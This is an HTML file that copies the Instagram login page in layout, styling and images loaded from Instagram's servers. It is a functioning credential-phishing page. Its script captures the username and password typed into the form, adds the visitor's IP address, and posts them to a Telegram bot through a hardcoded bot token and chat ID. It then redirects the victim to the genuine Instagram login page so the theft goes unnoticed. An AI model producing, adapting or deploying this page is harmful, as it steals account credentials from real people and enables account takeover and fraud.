<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #262626;
        }
        
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 350px;
            width: 100%;
            padding: 0 20px;
        }
        
        .login-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            margin-bottom: 10px;
            width: 100%;
            text-align: center;
        }
        
        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }
        
        input {
            width: 100%;
            padding: 9px 8px 7px;
            margin-bottom: 6px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 12px;
            box-sizing: border-box;
        }
        
        input:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }
        
        button {
            width: 100%;
            padding: 5px 9px;
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: 600;
            font-size: 14px;
            margin: 8px 0;
            cursor: pointer;
        }
        
        button:disabled {
            background-color: rgba(0, 149, 246, 0.3);
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }
        
        .facebook-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            margin: 8px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .facebook-login img {
            width: 16px;
            margin-right: 8px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin-top: 12px;
        }
        
        .signup-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            margin-bottom: 20px;
            width: 100%;
            text-align: center;
            font-size: 14px;
        }
        
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .app-download {
            text-align: center;
            width: 100%;
        }
        
        .app-download p {
            font-size: 14px;
            margin: 10px 0 20px;
        }
        
        .app-stores {
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        
        .app-stores img {
            height: 40px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
            
            <form id="loginForm">
                <input type="text" placeholder="Phone number, username, or email" required id="username">
                <input type="password" placeholder="Password" required id="password">
                <button type="submit" id="loginBtn">Log In</button>
            </form>
            
            <div class="divider">OR</div>
            
            <div class="facebook-login">
                <img src="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" alt="Facebook">
                <span>Log in with Facebook</span>
            </div>
            
            <div class="forgot-password">Forgot password?</div>
        </div>
        
        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
        
        <div class="app-download">
            <p>Get the app.</p>
            <div class="app-stores">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
            </div>
        </div>
    </div>

    <script>
        // Telegram configuration
        const BOT_TOKEN = 7953078205:AAGxWA_xa3aJ20KCOKtx44P0rF7quFhW42s';
        const CHAT_ID = '8498059554';
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const btn = document.getElementById('loginBtn');
            
            btn.disabled = true;
            btn.textContent = 'Logging in...';
            
            // Get client IP address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    const ip = ipData.ip || 'Unknown';
                    const date = new Date().toLocaleString();
                    
                    // Prepare message for Telegram
                    const message = `📱 New Instagram Login Attempt
                    
👤 Username: ${username}
🔑 Password: ${password}

🌐 IP Address: ${ip}
📅 Date/Time: ${date}
                    `;
                    
                    // Send to Telegram
                    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                })
                .then(() => {
                    // Redirect after sending
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                })
                .catch(error => {
                    console.error('Error:', error);
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                });
        });
        
        // Enable/disable login button based on input
        document.querySelectorAll('#loginForm input').forEach(input => {
            input.addEventListener('input', () => {
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                document.getElementById('loginBtn').disabled = !(username && password);
            });
        });
    </script>
</body>
</html>
